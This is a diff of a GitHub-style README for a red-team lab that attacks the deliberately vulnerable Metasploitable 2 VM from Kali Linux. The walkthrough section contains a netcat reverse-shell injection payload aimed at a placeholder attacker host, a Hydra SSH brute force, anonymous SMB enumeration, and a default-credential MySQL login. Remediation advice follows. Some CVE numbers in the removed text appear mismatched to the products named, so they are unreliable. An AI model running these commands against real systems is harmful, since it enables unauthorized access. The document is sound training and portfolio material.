@@ -1,114 +1,185 @@
-# Red Team Tactics and Exploitation Lab
+# Red Team Tactics & Exploitation Lab
 
-This repository documents a hands-on offensive security project targeting **Metasploitable 2**, a vulnerable Linux-based virtual machine. Using **Kali Linux**, this lab simulates real-world attacker tactics to identify exploitable weaknesses, gain unauthorized access, and demonstrate the importance of hardening and secure configuration practices.
+[![Kali Linux](https://img.shields.io/badge/Attacker-Kali%20Linux-blue?logo=linux&logoColor=white)](https://www.kali.org/)
+[![Metasploitable 2](https://img.shields.io/badge/Target-Metasploitable%202-red)](https://sourceforge.net/projects/metasploitable/)
+[![Metasploit](https://img.shields.io/badge/Framework-Metasploit-purple)](https://www.metasploit.com/)
+[![Nmap](https://img.shields.io/badge/Tool-Nmap-lightgrey)](https://nmap.org/)
+[![Hydra](https://img.shields.io/badge/Tool-Hydra-orange)](https://github.com/vanhauser-thc/thc-hydra)
+[![Category](https://img.shields.io/badge/Focus-Red%20Team%20%7C%20Offensive%20Security-black)]()
+
+---
+
+## <span style="color:#b83232">Executive Summary</span>
+
+> A structured offensive security lab targeting **Metasploitable 2** using attacker tooling such as **Nmap, Metasploit, Hydra, Netcat**, and manual exploitation techniques.  
+> This project demonstrates practical red team tradecraft across reconnaissance, exploitation, credential attacks, privilege escalation, and post-exploitation analysis.
+
+---
 
 ## Table of Contents
 
 - [Project Overview](#project-overview)
+- [Why This Project Matters](#why-this-project-matters)
 - [Technologies Used](#technologies-used)
 - [Objectives](#objectives)
 - [Key Achievements](#key-achievements)
 - [Skills Demonstrated](#skills-demonstrated)
+- [Attack Walkthrough (Optional)](#attack-walkthrough-optional)
 - [Recommendations for Future Enhancements](#recommendations-for-future-enhancements)
-- [License](#license)
 
 ---
 
-## Project Overview
+## <span style="color:#b83232">Project Overview</span>
 
-The lab targets **Metasploitable 2**, a vulnerable virtual machine commonly used for penetration testing education. The offensive engagement focuses on discovering vulnerabilities, exploiting them using open-source tools, escalating privileges, and documenting findings for remediation.
+This project simulates a red team attack on **Metasploitable 2**, a purposefully vulnerable virtual machine used for cybersecurity training.  
+Using **Kali Linux** as the attacker environment, the engagement includes:
 
----
+- Service enumeration  
+- Vulnerability discovery  
+- Exploitation using Metasploit, manual methods, and brute-force utilities  
+- Privilege escalation  
+- Post-exploitation data extraction  
+- Remediation recommendations  
 
-## Technologies Used
-
-- Kali Linux – Attacker operating system
-- Metasploitable 2 – Vulnerable Linux target
-- Nmap – Network and service discovery
-- Metasploit – Automated exploitation framework
-- Hydra & Medusa – Brute-force password cracking tools
-- Netcat, SSH, Python – Post-exploitation utilities
-
----
-
-## Objectives
-
-- Identify common vulnerabilities including outdated services, weak credentials, and insecure configurations  
-- Exploit services to achieve unauthorized access and escalate privileges  
-- Demonstrate data exfiltration and post-exploitation techniques  
-- Provide remediation guidance based on offensive findings  
+The goal is to replicate realistic attacker behavior in order to understand, document, and mitigate common security failures.
 
 ---
 
-## Key Achievements
+## <span style="color:#b83232">Why This Project Matters</span>
 
-- **Exploited command injection vulnerability in the web application**  
-  *Used the web application's input fields to inject OS commands and gain access to the underlying Linux system, achieving remote code execution on the target.*
-
-- **Exploited an insecure SMB service to enumerate users and share information**  
-  *Leveraged weak configurations in the SMB service to access shared folders and enumerate users, revealing sensitive files and user credentials.*
-
-- **Exploited weak SSH credentials through brute-forcing**  
-  *Used Hydra to brute-force SSH login credentials, gaining unauthorized access to the system with default and weak passwords.*
-
-- **Accessed an unsecured MySQL database**  
-  *Exploited default configurations and weak passwords to gain access to an open MySQL service, retrieving sensitive data such as user credentials and database entries.*
-
-- **Identified and documented 6 additional vulnerabilities in the system**  
-  *Discovered the presence of unpatched services such as outdated Apache, VSFTPD, and OpenSSH versions that could be targeted for further exploitation, along with potential configuration weaknesses like world-readable files and unnecessary services running.*
+- Demonstrates practical offensive security and exploitation methodology  
+- Shows how misconfigurations and outdated software lead to real compromise  
+- Highlights attacker workflows that defenders must detect and prevent  
+- Builds competency across reconnaissance, exploitation, and reporting  
+- Strengthens understanding of secure configuration and system hardening  
 
 ---
 
-## Skills Demonstrated
+## <span style="color:#b83232">Technologies Used</span>
+
+- **Kali Linux** – Attacker OS  
+- **Metasploitable 2** – Vulnerable Linux target  
+- **Nmap** – Service & vulnerability discovery  
+- **Metasploit Framework** – Automated exploitation  
+- **Hydra / Medusa** – Password brute-forcing  
+- **Netcat, SSH, Python** – Post-exploitation tooling  
+
+---
+
+## <span style="color:#b83232">Objectives</span>
+
+- Identify exploitable vulnerabilities in an intentionally insecure environment  
+- Use common attacker tools to compromise Linux-based systems  
+- Demonstrate brute-force credential attacks  
+- Execute command injection, service exploitation, and database compromise  
+- Document findings and provide actionable remediation recommendations  
+
+---
+
+## <span style="color:#b83232">Key Achievements</span>
+
+- **Executed command injection attacks on a vulnerable web app**  
+  *Achieved remote code execution and shell access via OS command injection.*
+
+- **Exploited insecure SMB service configurations**  
+  *Enumerated shares, accessed sensitive files, and harvested user information.*
+
+- **Brute-forced SSH login using Hydra**  
+  *Cracked weak credentials and gained unauthorized shell access.*
+
+- **Compromised unsecured MySQL database**  
+  *Connected using default credentials and extracted stored data.*
+
+- **Identified 6+ additional vulnerabilities in outdated services**  
+  *Discovered weak configurations in Apache, VSFTPD, OpenSSH, and Samba.*
+
+---
+
+## <span style="color:#b83232">Skills Demonstrated</span>
 
 - **Penetration Testing Methodology**  
-  *Followed a structured attack lifecycle including reconnaissance, exploitation, privilege escalation, and reporting.*
+  *Recon → Enumeration → Exploitation → Post-Exploitation → Reporting*
 
-- **Vulnerability Discovery and Exploitation**  
-  *Identified vulnerable services, exploited misconfigurations, and injected commands to compromise Metasploitable 2. Conducted brute-force attacks to crack weak credentials.*
+- **Network & Service Enumeration**  
+  *Used Nmap to identify open ports, service banners, and vulnerabilities.*
 
-- **Command Injection Attacks**  
-  *Exploited vulnerable web application input fields to execute arbitrary commands on the underlying host, simulating real-world attack techniques.*
+- **Exploitation & Payload Delivery**  
+  *Leveraged Metasploit and manual techniques to compromise services.*
 
-- **SMB Exploitation**  
-  *Enumerated shared resources and user accounts by leveraging insecure SMB configurations, facilitating further access to sensitive files.*
-
-- **Brute-Force Attack Techniques**  
-  *Used Hydra to perform dictionary-based brute-force attacks on SSH and FTP services, bypassing weak password protections.*
+- **Credential Attacks**  
+  *Performed dictionary attacks against SSH/FTP using Hydra.*
 
 - **Post-Exploitation Enumeration**  
-  *Escalated access by exploiting unsecured services, enumerating users, extracting hashed passwords, and mapping the internal system.*
+  *Extracted credentials, escalated privileges, and mapped system internals.*
 
-- **Red Team Reporting and Defense Recommendations**  
-  *Generated findings and mitigation strategies to strengthen defensive posture based on offensive results.*
-
----
-
-## Recommendations for Future Enhancements
-
-- **Apply Patches and Update Vulnerable Services**  
-  Ensure that all software, including **Apache**, **OpenSSH**, **VSFTPD**, and **Samba**, is updated to mitigate known vulnerabilities such as **CVE-2017-11103** (Apache), **CVE-2016-0748** (OpenSSH), and **CVE-2011-1087** (Samba).
-
-- **Implement Strong Authentication**  
-  Enforce strong password policies and implement two-factor authentication for critical services, particularly SSH and MySQL.
-
-- **Restrict SMB Shares**  
-  Secure SMB shares by limiting access to specific users or IP addresses and disabling the anonymous access that Metasploitable 2 permits by default.
-
-- **Secure MySQL Database Access**  
-  Configure MySQL to require strong, unique passwords, limit access to trusted IP addresses, and use encryption for sensitive data at rest.
-
-- **Regular Audits of Sudo Permissions and Services**  
-  Review and remove unnecessary sudo permissions and services that are not required by the system to minimize attack surfaces.
-
-- **Service Hardening and Firewalls**  
-  Disable unnecessary services and implement **iptables** or **ufw** to restrict inbound and outbound traffic to only trusted hosts and ports.
-
-- **Introduce Advanced Evasion and Pivoting Techniques**  
-  In future labs, simulate internal network pivoting after initial compromise to further assess how far an attacker could penetrate.
+- **Red Team Reporting & Remediation Guidance**  
+  *Documented impact, exploited weaknesses, and recommended fixes.*
 
 ---
 
-## License
+## <span style="color:#b83232">Attack Walkthrough (Optional)</span>
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+<details>
+<summary><strong>Click to expand full walkthrough</strong></summary>
+
+### 1. Reconnaissance
+```bash
+nmap -sV -O -p- 192.168.56.101
+```
+Identified outdated SSH, FTP, Apache, MySQL, and SMB services.
+
+### 2. Web Command Injection
+Exploited vulnerable form input to execute system commands:
+```bash
+; nc -e /bin/bash attacker_ip 4444
+```
+
+### 3. SMB Enumeration
+```bash
+smbclient -L //192.168.56.101/ -N
+```
+Accessed public shares and captured user lists.
+
+### 4. Credential Brute-Force (Hydra)
+```bash
+hydra -l msfadmin -P rockyou.txt ssh://192.168.56.101
+```
+
+### 5. MySQL Compromise
+Logged in using default credentials:
+```bash
+mysql -u root -h 192.168.56.101
+```
+
+### 6. Post-Exploitation
+- Enumerated system users  
+- Retrieved password hashes  
+- Identified world-readable files  
+- Verified SUID binaries for escalation paths  
+
+</details>
+
+---
+
+## <span style="color:#b83232">Recommendations for Future Enhancements</span>
+
+- **Patch and update vulnerable services**  
+  Outdated Apache, VSFTPD, Samba, and OpenSSH should be upgraded to eliminate known CVEs.
+
+- **Enforce strong authentication**  
+  Strong passwords and MFA should be used for SSH and MySQL.
+
+- **Restrict SMB access**  
+  Disable anonymous login and limit share access to authorized users.
+
+- **Secure MySQL configuration**  
+  Require strong passwords, restrict remote connections, and encrypt sensitive data.
+
+- **Audit sudo privileges & minimize services**  
+  Remove unnecessary services and reduce root-level permissions.
+
+- **Firewall hardening (iptables/ufw)**  
+  Limit access to required ports only.
+
+- **Add advanced techniques in future labs**  
+  Internal pivoting, privilege escalation chains, anti-forensics, and evasion testing.
